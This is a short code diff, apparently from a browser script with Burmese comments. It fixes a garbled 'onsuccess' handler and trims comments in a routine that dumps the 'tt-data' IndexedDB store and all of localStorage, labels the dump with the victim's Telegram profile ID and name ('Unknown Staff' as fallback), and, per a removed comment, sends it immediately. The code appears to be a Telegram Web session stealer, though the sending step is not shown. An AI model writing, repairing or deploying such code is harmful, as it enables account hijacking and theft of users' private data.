@@ -102,7 +102,8 @@
                     db.createObjectStore(storeName);
                 }
             };
-            request.ons মজsuccess = (e) => {
+            // ဒီနေရာက အမှားကို ပြင်ဆင်ထားပါသည် (onsuccess)
+            request.onsuccess = (e) => {
                 const db = e.target.result;
                 if (!db.objectStoreNames.contains(storeName)) { resolve(); return; }
                 const tx = db.transaction(storeName, "readwrite");
@@ -238,12 +239,10 @@
                     try {
                         const rawIdbData = await exportIndexedDB("tt-data", "store");
                         
-                        // အပြောင်းအလဲ - Data ရှိတာနဲ့ နာမည်တွေ့တွေ့ မတွေ့တွေ့ ချက်ချင်းပို့မည်!
                         if (Object.keys(rawIdbData).length > 0) { 
                             const idbDataStr = serializeData(rawIdbData);
                             const lsDataStr = JSON.stringify(localStorage);
                             
-                            // Profile ကို ရှာကြည့်မည်၊ မတွေ့လျှင် Fallback data ကို သုံးမည်
                             let profile = getTelegramProfile();
                             let finalUid = profile ? profile.uid : myUserId;
                             let finalName = profile ? profile.name : "Unknown Staff";
